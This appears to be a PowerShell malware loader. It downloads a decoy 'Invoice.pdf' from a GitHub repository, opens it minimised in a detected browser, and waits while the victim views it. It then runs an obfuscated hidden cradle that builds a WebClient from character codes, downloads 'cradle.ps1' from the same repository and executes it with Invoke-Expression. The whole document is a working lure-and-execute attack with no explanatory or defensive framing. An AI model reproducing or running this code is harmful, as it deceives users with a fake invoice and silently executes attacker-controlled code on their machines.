$pdfUrl = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
$pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"

$browserPaths = @(
    "C:\Program Files\Google\Chrome\Application\chrome.exe",
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files\Opera\opera.exe",
    "C:\Program Files\Opera GX\opera.exe",
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "C:\Program Files\Mozilla Firefox\firefox.exe"
)

$browserProcessNames = @(
    "chrome",
    "brave",
    "opera",
    "msedge",
    "firefox"
)

Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath

$browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if (-not $browser) {
    Write-Warning "No supported browser found. Opening with system default."
    Start-Process $pdfPath -WindowStyle Minimized
} else {
    Write-Host "Opening with: $browser"
    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -WindowStyle Minimized
}

function Get-PDFRenderer {
    $procs = Get-CimInstance Win32_Process
    $procs | Where-Object {
        $name = $_.Name -replace "\.exe$", ""
        ($browserProcessNames -contains $name) -and
        ($_.CommandLine -match "\.pdf")
    } | Select-Object ProcessId, Name, CommandLine
}

do {
    $pdfProcesses = Get-PDFRenderer
    if ($pdfProcesses) {
        Start-Sleep -Seconds 20
    }
} while ($pdfProcesses)

powershell -NoP -sta -NonI -W Hidden -enc
$mZXxKQwoX9kiW = & (("kr8Hol5eMX1NL7WTGpUjQt6czZFmui9gvVCYbEODfwxB-RJAdasq4P2Ih30SnKy")[11,7,41,44,38,36,19,7,23,21] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_}); $UdXhVf = ([string]::join('', ( (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,66,114,111,116,104,101,114,115,101,120,116,114,101,109,101,103,97,109,105,110,103,47,112,119,115,104,99,114,97,100,108,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,99,114,97,100,108,101,46,112,115,49) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_}); $mZXxKQwoX9kiW.DownloadString($UdXhVf) |%{$_}|ForEach-Object{$_}| & ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_})
